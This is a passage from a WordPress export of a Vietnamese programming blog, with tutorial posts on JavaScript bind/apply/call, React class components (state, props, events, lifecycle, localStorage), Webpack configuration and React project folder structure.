        convert.func2 = example.func2.bind(convert, "abc", "xyz"); // arrow function không có this, nên không thể bind "convert" được
        convert.func1(789) // {data: 99, func1: ƒ, func2: ƒ} 123 456 789
        convert.func2("ijk") // Window, 'abc' 'xyz' 'ijk'
        console.log("====================================================================")

        example.func1.apply(convert, [123, 456]) // {data: 99, func1: ƒ, func2: ƒ} 123 456 undefined
        example.func2.apply(convert, ["abc", "xyz"]) // Window, 'abc' 'xyz' undefined
        console.log("====================================================================")

        example.func1.call(convert, 123, 456) // {data: 99, func1: ƒ, func2: ƒ} 123 456 undefined
        example.func2.call(convert, "abc", "xyz") // Window, 'abc' 'xyz' undefined
    </script>
</head>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1316</wp:post_id>
		<wp:post_date><![CDATA[2021-07-03 22:31:39]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-07-03 15:31:39]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-07-28 10:41:37]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-07-28 10:41:37]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[bind-apply-call-va-this-trong-javascript]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="javascript"><![CDATA[Javascript]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_old_slug]]></wp:meta_key>
		<wp:meta_value><![CDATA[es6-hoisting-this-arrow-funtion]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[ReactJS - 4.1. Class: Props, State và Global State]]></title>
		<link>https://duycode.com/2021/07/15/reactjs-4-1-class-props-state-va-global-state/</link>
		<pubDate>Wed, 14 Jul 2021 21:01:22 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1329</guid>
		<description></description>
		<content:encoded><![CDATA[-- Props: truyền dữ liệu từ component cha cho component con
-- State: dữ liệu nội bộ của 1 component
-- Global State: dữ liệu của nhiều component -> thường dùng Redux

<h2>1. State</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        class App extends React.Component {
            constructor(props) {
                super(props);

                this.state = {
                    username: 'username...'
                }
            };

            //input lấy value realtime từ state
            //input set ngược lại state bằng onchange(), trong đó biến event được gán vào tự động
            //set State bằng setState();
            render() {
                return (
                    <div>
                        <input type="text" value={this.state.username}
                            onChange={(e) => { this.setState({ username: e.target.value }) }} />
                        <h4>{this.state.username}</h4>
                    </div>
                );
            }
        }

        ReactDOM.render(
            <App />,
            document.getElementById('root')
        );

    </script>
</body>

</html>
</pre>

<h2>2. Props</h2>
-- Truyền dữ liệu từ component cha về component con bằng cách dùng props là ok
-- Ông component con truyền ngược lại cha bằng callback -> happy
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        class App extends React.Component {
            constructor(props) {
                super(props);

                this.state = {
                    username: 'username...'
                }
                this.onUpdateState = this.onUpdateState.bind(this);
            };
            onUpdateState(e, customText="") {
                this.setState({ username: e.target.value + customText });
            }
            render() {
                return (
                    <div>
                        <Content myDataProp={this.state.username}
                            updateStateProp={this.onUpdateState}></Content>
                    </div>
                );
            }
        }

        //input nhận dữ liệu từ component cha thông qua props
        //input bắn dữ liệu ngược lại về component cha bằng callback
        //có thể dùng thêm parametter bằng cách dùng dùng arrow function
        class Content extends React.Component {
            constructor(props) {
                super(props);
                this.customText = " - plus"
            };
            render() {
                return (
                    <div>
                        <input type="text" onChange={(event) => { this.props.updateStateProp(event, this.customText) }} />
                        <input type="text" onChange={this.props.updateStateProp} />
                        <h3>{this.props.myDataProp}</h3>
                    </div>
                );
            }
        }

        ReactDOM.render(
            <App />,
            document.getElementById('root')
        );

    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1329</wp:post_id>
		<wp:post_date><![CDATA[2021-07-15 04:01:22]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-07-14 21:01:22]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-07-15 04:01:22]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-07-14 21:01:22]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[reactjs-4-1-class-props-state-va-global-state]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[Tutorial – 3. Event, sử dụng 'this' trong Class]]></title>
		<link>https://duycode.com/2021/07/15/tutorial-3-event-su-dung-this-trong-class/</link>
		<pubDate>Wed, 14 Jul 2021 20:00:23 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1331</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        class App extends React.Component {
             customer;
            constructor(props) {
                super(props);
                this.customText = "hahaha, this is cutom text"
                this.onClickConstruct = this.onClickConstruct.bind(this, this.customText)
            }
            //biến event tự động được gán vào hàm khi được gọi bằng phương thước event trong render
            //event này là event của react, không giống event của javascript
            //thường hay lấy: even.target để lấy element đc action bởi event
            onClickNormal(e) {
                console.log("props: ",this.customer)
                //Không thể sử dụng "console.log("Props: ",this.props)" ở đây
                //vì ở hàm này là 1 funtion bình thường của onclick trong object của "button" có dạng: onclick = function(){}
                // => vì vậy "this" sẽ trỏ về "button"
                console.log(e, e.target);
                alert('onClickNormal');
            }
            onClickArrowFuntion(e) {
                //Có thể sử dụng "console.log("Props: ",this.props)" ở đây
                //vì ở hàm này là 1 funtion bình thường => "this" sẽ trỏ về thằng cha của nó
                //mà thằng cha của nó lại là 1 arrow funtion => nên "this" lại chính là "this" của thằng arrow-function đó
                //arrowfunction đó của onclick trong object của "button" có dạng: onclick = ()=>{}
                // => 'this' của arrowfunction lại là thằng chứa thằng "button" => chính là đối tượng của class này :v hahaha
                console.log(e, e.target);
                alert('onClickArrowFuntion');
            }
            onClickArrowFuntion2 = (e) => {
                //được dùng "this", vì đây là arrowfuntion => this sẽ trỏ về đối tượng của class
                console.log("Props: ",this.props)
                console.log(e, e.target);
                alert('onClickArrowFuntion2');
            }


            //Muốn sử dụng "this" như "this.props" thì cần "bind(this)" vào khi gọi hàm, nếu không sẽ gây ra lỗi
            onclickBind(text) {
                console.log("Props: ", this.props);
                alert(text);
            }
            onClickConstruct(text) {
                console.log("Props: ", this.props);
                alert(text);
            }
            onClickBindAndArrowFunction(event, text) {
                console.log("Props: ", this.props);
                console.log(event);
                alert(text);
            }

            //1. Có thể dùng function 1 cách trực tiếp
            //2. Có thể bind this và param trong html
            //3. Cũng có thể bind khi gọi biến tại constructor
            //4. Cũng có thể dùng arrow funtion để gọi hàm
            render() {
                return (
                    <div>
                        <button type="button" className="btn btn-default" onClick={this.onClickNormal}>
                            onClickNormal !
                        </button><br /><br />
                        <button type="button" className="btn btn-default" onClick={(e) => this.onClickArrowFuntion(e)}>
                            onClickArrowFuntion !
                        </button><br /><br />
                        <button type="button" className="btn btn-default" onClick={this.onClickArrowFuntion2}>
                            onClickArrowFuntion2 !
                        </button><br /><br /><hr /><br />

                        <button type="button" className="btn btn-default" onClick={this.onclickBind.bind(this, this.customText)}>
                            onclickBind !
                        </button><br /><br />
                        <button type="button" className="btn btn-default" onClick={this.onClickConstruct}>
                            onClickConstruct !
                        </button><br /><br />
                        <button type="button" className="btn btn-default" onClick={(event) => this.onClickBindAndArrowFunction(event, this.customText)}>
                            onClickBindAndArrowFunction !
                        </button><br /><br />
                    </div>
                );
            }
        }

        ReactDOM.render(
            <App />,
            document.getElementById('root')
        );

    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1331</wp:post_id>
		<wp:post_date><![CDATA[2021-07-15 03:00:23]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-07-14 20:00:23]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-07-15 03:00:23]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-07-14 20:00:23]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[tutorial-3-event-su-dung-this-trong-class]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[Webpack cơ bản]]></title>
		<link>https://duycode.com/2021/07/08/webpack-co-ban/</link>
		<pubDate>Thu, 08 Jul 2021 07:03:09 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1343</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Cài đặt thư viện</h2>
<img src="https://webpack.js.org/icon-square-small.85ba630cf0c5f29ae3e3.svg" width="50px" height="50px" alt="">
<pre>
//webpack core:
npm i -D @babel/core babel-loader @babel/preset-env @babel/preset-react

//webpack server
npm i -D webpack webpack-cli webpack-dev-server

//css loader
npm i -D style-loader css-loader sass sass-loader

//file loader 
npm i -D file-loader

//typscript loader
npm i -D typescript ts-loader

//plugin: dọn dẹp thư mục dist, tạo file html, tách file css
npm i -D clean-webpack-plugin html-webpack-plugin mini-css-extract-plugin
</pre>

<pre>
    <!-- Full Install :D -->
    npm i -D @babel/core babel-loader @babel/preset-env @babel/preset-react webpack webpack-cli webpack-dev-server style-loader css-loader sass sass-loader file-loader typescript ts-loader html-webpack-plugin mini-css-extract-plugin
</pre>

<h2>2. Tạo file ./webpack.config.js</h2>
<pre>
const { CleanWebpackPlugin } = require('clean-webpack-plugin');
const HtmlWebpackPlugin = require('html-webpack-plugin');
const MiniCssExtractPlugin = require('mini-css-extract-plugin');
const path = require('path');

module.exports = (env = {}, options = {}) => {
    return {
        entry: { bundle: './src/index.js' },
        output: {
            path: path.resolve(__dirname, 'dist'),
            filename: 'bundle.js',
        },
        module: {
            rules: [
                // Loader file js, jsx => preset-env để chuyển ES6 trở lên về ES5, preset-react chuyển JSX về ES5
                {
                    test: /\.js$|\.jsx$/i,
                    use: {
                        loader: 'babel-loader',
                        options: {
                            "presets": ["@babel/preset-env", "@babel/preset-react"]
                        }
                    },
                    include: path.resolve(__dirname, 'src'),
                    exclude: /node_modules/,
                },

                // Loader file css, scss, sass
                // Ở mode development => inject css vào thẻ "<style></style>" cho tốc độ nhanh hơn
                // Ở mode production => tạo ra file css mới bằng "MiniCssExtractPlugin" để load file nhanh hơn
                {
                    test: /\.(sa|sc|c)ss$/i,
                    use: [
                        ((mode) => {
                            if (mode == "development") return "style-loader"
                            if (mode == "production") return MiniCssExtractPlugin.loader
                        })(options.mode),
                        "css-loader",
                        "sass-loader"
                    ],
                    include: path.resolve(__dirname, 'src'),
                },

                // Loader file, trường hợp này là loader ảnh :D
                {
                    test: /\.(png|jpe?g|gif|svg)$/i,
                    loader: 'file-loader',
                    options: {
                        outputPath: 'images',
                        name: '[name]_[hash:base64:5].[ext]',
                    },
                },
            ]
        },
        plugins: [
            // Dọn dẹp thư mục /dist
            new CleanWebpackPlugin(),
            // Tạo ra file HTML bằng plugin
            new HtmlWebpackPlugin({
                templateContent: `<html><head><meta charset="UTF-8"></head><body><div id="app"></div></body></html>`,
                meta: { 'viewport': 'width=device-width, initial-scale=1.0' },
            }),
            //Tách css thành 1 file riêng bằng plugin
            new MiniCssExtractPlugin()
        ],
        // Hiển thị khi build
        stats: {
            modules: false,
        },
        // Cài đặt webpack-server
        devServer: {
            static: path.resolve(__dirname, 'dist'),
            port: 5556,
        },
    }
};
</pre>

<h2>3. Sử dụng CSS trong dự án</h2>

<h3>Dạng 1. Sử dụng dạng global</h3>
<pre>
import './reset.css'
import './index.scss'
</pre>

<h3>Dạng 2. Sử dụng dạng module</h3>
-- Cài đặt webpack-config
<pre>
{
    loader: "css-loader",
    options: {
        esModule: true,
        modules: {
            namedExport: true,
            localIdentName: "[name]__[local]__[hash:base64:5]",
        },
    },
},
"sass-loader"
</pre>
<pre>
import * as styles from './header.css'
import * as styles from './main.scss'
</pre>

<h3>Dạng 3. Sử dụng dạng CSS-in-JS</h3>
- Cách này không cần sử dụng webpack
- Sử dụng các thư viện ngoài như: style-component]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1343</wp:post_id>
		<wp:post_date><![CDATA[2021-07-08 14:03:09]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-07-08 07:03:09]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-07-08 14:03:09]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-07-08 07:03:09]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[webpack-co-ban]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="mongodb"><![CDATA[MongoDB]]></category>
						</item>
					<item>
		<title><![CDATA[ReactJS – 4.4. Class: Lifecylce - localStorage và getAPI]]></title>
		<link>https://duycode.com/2021/07/15/reactjs-4-4-class-lifecylce-localstorage-va-getapi/</link>
		<pubDate>Wed, 14 Jul 2021 21:04:20 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1375</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. LocalStorage</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>ReactJS</title>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        class App extends React.Component {
            constructor(props) {
                super(props);
                this.state = {
                    id: 0,
                    username: 'Loading...',
                };
            }

            //sử dụng setState khi get được localstorage trong componentWillMount()
            componentDidMount() {
                if (localStorage && localStorage.getItem('username')) {
                    this.setState({
                        username: JSON.parse(localStorage.getItem('username')),
                    })

                }
            }

            componentDidUpdate(prevProps, prevState) {
                if (prevState.username !== this.state.username) {
                    localStorage.setItem('username', JSON.stringify(this.state.username));
                }
            }

            render() {
                return (
                    <div>
                        <input type="text" name="username"
                            value={this.state.username}
                            onChange={(e) => { this.setState({ username: e.target.value }) }} />
                        <h4> - Username: {this.state.username}</h4>
                    </div>
                );
            }
        }

        ReactDOM.render(<App />, document.getElementById('root'));
    </script>
</body>

</html>
</pre>

<h2>2. getAPI in Lifecycle</h2>
<pre>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
	<title>ReactJS</title>
</head>

<body>
	<div id="app"></div>
	<script crossorigin src="https://cdnjs.cloudflare.com/ajax/libs/react/15.0.0/react.js"></script>
	<script crossorigin src="https://cdnjs.cloudflare.com/ajax/libs/react/15.0.0/react-dom.js"></script>
	<script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

	<script type="text/babel">
		class Student extends React.Component {
			constructor(props) {
				super(props);
				this.isComponentMounted = false;
				this.state = {
					student: {
						name: 'Loading...',
						email: 'Loading...',
					},
				};
			}

			componentDidMount() {
				this.isComponentMounted = true;
				this.getStudent(1);
			}

			componentDidUpdate(prevProps, prevState) {
				if (prevProps.id == this.props.id) return;
				this.getStudent(this.props.id);
			}

			componentWillUnmount() {
				this.isComponentMounted = false;
			}

			async getStudent(id) {
				try {
					let student = await this.api_Student(id);
					//Khi component bị unmount rồi thì sẽ không setState được nữa
					if (this.isComponentMounted) {
						this.setState({
							student: student,
						});
					}
				} catch (error) {
					console.log(error);
				}
			}

			api_Student(id) {
				// Mình sẽ giả lập gọi api getStudent bằng hàm setTimeout nhé
				// Hành động thực tế ở đây là sẽ phải gọi api để lấy thông tin sinh viên theo id nha
				// Và Sau khi lấy được thông tin thì trả về thông tin sinh viên get được
				return new Promise((resolve, reject) => {
					setTimeout(() => {
						if (1 == 1) {
							let student = {
								name: 'John Baker - ' + id,
								email: 'jhon@gmail.com - ' + id,
							};
							return resolve(student);
						}
						reject("Can't get Student");
					}, 1000);
				});
			}

			render() {
				return (
					<div>
						<p>ID: <strong>{this.props.id}</strong></p>
						<p>Name: <strong>{this.state.student.name}</strong></p>
						<p>Email: <strong>{this.state.student.email}</strong></p>
					</div>
				);
			}
		}

		class App extends React.Component {
			constructor(props) {
				super(props);
				this.state = {id: 0};
			}

			render() {
				return (
					<div>
						<input type="text" name="id" value={this.state.id}
							onChange={(e) => {
								this.setState({ id: e.target.value });
							}}
						/>
						<Student id={this.state.id} />
					</div>
				);
			}
		}

		ReactDOM.render(<App />, document.getElementById('app'));
	</script>
</body>
</html>

</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1375</wp:post_id>
		<wp:post_date><![CDATA[2021-07-15 04:04:20]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-07-14 21:04:20]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-07-15 04:04:20]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-07-14 21:04:20]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[reactjs-4-4-class-lifecylce-localstorage-va-getapi]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[ReactJS – 4.3. Class: Lifecylce]]></title>
		<link>https://duycode.com/2021/07/15/reactjs-4-3-class-lifecylce/</link>
		<pubDate>Wed, 14 Jul 2021 21:03:35 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1379</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="http://thaunguyen.com/blog/wp-content/uploads/2019/06/lifecycle.jpg" alt="Life cycle ReactJS" />
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        class App extends React.Component {
            constructor(props) {
                super(props);
                console.log("App - Constructor");
                this.state = {
                    showCounter: true,
                }
            };

            render() {
                console.log("App - Render");
                return (
                    <div>
                        <button onClick={() => { this.setState({ showCounter: !this.state.showCounter }) }}>
                            Remove Counter Component
                        </button><br /><br />
                        {this.state.showCounter ? <Counter /> : ''}
                    </div>
                );
            }
        }

        //Vòng đời của Compomnent được liệt kê dưới đây
        class Counter extends React.Component {
            constructor(props) {
                super(props);
                console.log("Counter - Constructor");
                this.state = {
                    count: 0,
                }
            }

            // UNSAFE_componentWillMount() {
            //     console.log('Counter - UNSAFE_componentWillMount')
            // }

            // UNSAFE_componentWillReceiveProps(newProps) {
            //     console.log('Counter - UNSAFE_componentWillReceiveProps')
            // }

            // UNSAFE_componentWillUpdate(nextProps, nextState) {
            //     console.log('Counter - UNSAFE_componentWillUpdate');
            // }

            // getDerivedStateFromProps là API mới, để loại bỏ 3 API không an toàn phía trên (đã bị thêm chữ UNSAFE_)
            static getDerivedStateFromProps(props, state) {
                console.log('Counter - getDerivedStateFromProps')
                //return null: không thay đổi trạng thái
                return null;
            }

            shouldComponentUpdate(newProps, newState) {
                console.log('Counter - shouldComponentUpdate');
                //return true: nghĩa là luôn update khi Component cha của nó render lại: UNSAFE_componentWillReceiveProps -> UNSAFE_componentWillUpdate -> Render -> componentDidMount
                //return false: ngược lại, lifecycle chỉ chạy đến: UNSAFE_componentWillReceiveProps -> stop
                if (this.state.count === newState.count) {
                    return false
                }
                return true;
            }

            render() {
                console.log("Counter - Render");
                return (
                    <div>
                        <button onClick={() => { this.setState({ count: this.state.count + 1 }) }}>Counter Increment</button>
                        <h3>Counter Count: {this.state.count}</h3>
                    </div>
                );
            }

            getSnapshotBeforeUpdate(prevProps, prevState) {
                console.log('Counter - getSnapshotBeforeUpdate')
                //return null: không thay đổi trạng thái
                return null;
            }

            //Thường thì chỉ dùng 3 function chính dưới đây
            componentDidMount() {
                //Chỉ thực hiện 1 lần duy nhất khi Component được khởi tạo
                //Gọi API tại đây
                console.log('Counter - componentDidMount')
            }

            componentDidUpdate(prevProps, prevState) {
                //HẠN CHẾ DÙNG, và khi dùng phải cực kỳ cẩn thận
                //Không được setState bên trong DidUpdate ==> vì nó sẽ sinh ra vòng lặp vô tận :((
                console.log('Counter - componentDidUpdate');
            }

            componentWillUnmount() {
                //Chỉ thực hiện 1 lần duy nhất khi Component bị hủy
                //Clear Timeout hoặc Interval tại đây, hoặc Reset dữ liệu Redux
                console.log('Counter - componentWillUnmount')
            }

        }

        ReactDOM.render(
            <App />,
            document.getElementById('root')
        );

    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1379</wp:post_id>
		<wp:post_date><![CDATA[2021-07-15 04:03:35]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-07-14 21:03:35]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-07-15 04:03:35]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-07-14 21:03:35]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[reactjs-4-3-class-lifecylce]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[Các thuật ngữ kỹ thuật được sử dụng trong FrontEnd]]></title>
		<link>https://duycode.com/2021/07/15/cac-thuat-ngu-ky-thuat-duoc-su-dung-trong-frontend/</link>
		<pubDate>Thu, 15 Jul 2021 08:07:58 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1384</guid>
		<description></description>
		<content:encoded><![CDATA[1. Javascript
- Call Stack
- Lazy Load
- Adaptive Image: hình ảnh phù hợp với thiết bị
- Memoization: lưu kết quả cho những function đã thực hiện với parametter đó rồi

2. UI/UX
- Debounce - Throttle : Delay sử dụng function (như là khi gõ search)
- Infinite Scroll  
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1384</wp:post_id>
		<wp:post_date><![CDATA[2021-07-15 15:07:58]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-07-15 08:07:58]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-07-15 15:07:58]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-07-15 08:07:58]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[cac-thuat-ngu-ky-thuat-duoc-su-dung-trong-frontend]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="mongodb"><![CDATA[MongoDB]]></category>
						</item>
					<item>
		<title><![CDATA[Tutorial - 2. Cấu trức thư mục và quản lý các Module]]></title>
		<link>https://duycode.com/2021/07/15/reactjs-2-cau-truc-thu-muc-va-quan-ly-cac-module/</link>
		<pubDate>Wed, 14 Jul 2021 19:00:30 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1396</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Tổ chức folder của ReactJS</h2>
1.1. Tổ chức theo loại: actions, reducers ,...
<pre>
.
├── node_modules
├── src
│    ├── api
│    │    ├── axiosClient.js
│    │    ├── productApi.js
│    │    ├── categoryApi.js
│    │    └── ...
│    ├── components
│    │    ├── Common (các component dùng chung)
│    │    │    ├── Header.js
│    │    │    ├── NotFound.js
│    │    │    └── Button.js
│    │    ├── Product.js
│    │    ├── Category.js
│    │    └── ...
│    ├── reducers
│    │    ├── product.js
│    │    ├── category.js
│    │    ├── ...
│    │    └── index.js (root reducer)
│    ├── actions
│    │    ├── product.js
│    │    ├── category.js
│    │    └── ...
│    ├── pages
│    │    ├── HomePage.jsx
│    │    └── ...
│    ├── store.js
│    ├── index.js
│    └── App.js
├── public
│    ├── ...
│    └── index.html
├── .env
├── .gitignore
├── package-lock.json
├── package.json
└── Procfile
</pre>

1.2. Tổ chức theo features(chức năng)
<pre>
.
├── node_modules
├── src
│    ├── assets
│    │    ├── images
│    │    └── styles (global styles)
│    ├── components (shared components)
│    │    ├── Button.js
│    │    ├── Header.js
│    │    ├── NotFound.js
│    │    ├── Form.js
│    │    └── ...
│    ├── features
│    │    ├── Photo
│    │    │    ├── components
│    │    │    │    ├── PhotoList
│    │    │    │    ├── PhotoCard
│    │    │    │    └── ...
│    │    │    ├── pages
│    │    │    │    ├── MainPage
│    │    │    │    ├── AddEditPage
│    │    │    │    └── ...
│    │    │    ├── photoSlice.js
│    │    │    └── index.js
│    │    ├── Category
│    │    └── ...
│    ├── store.js
│    ├── index.js
│    └── App.js
├── public
│    ├── ...
│    └── index.html
├── .env
├── .gitignore
├── package-lock.json
├── package.json
└── Procfile
</pre>

<h2>II. Các Module thường dùng</h2>
1. State Management: Redux
-- Redux Saga - Redux Thunk
-- Redux Toolkit

2. Form Module
-- Formik
-- React Hook Form
-- Validate: Yup

3. API Module

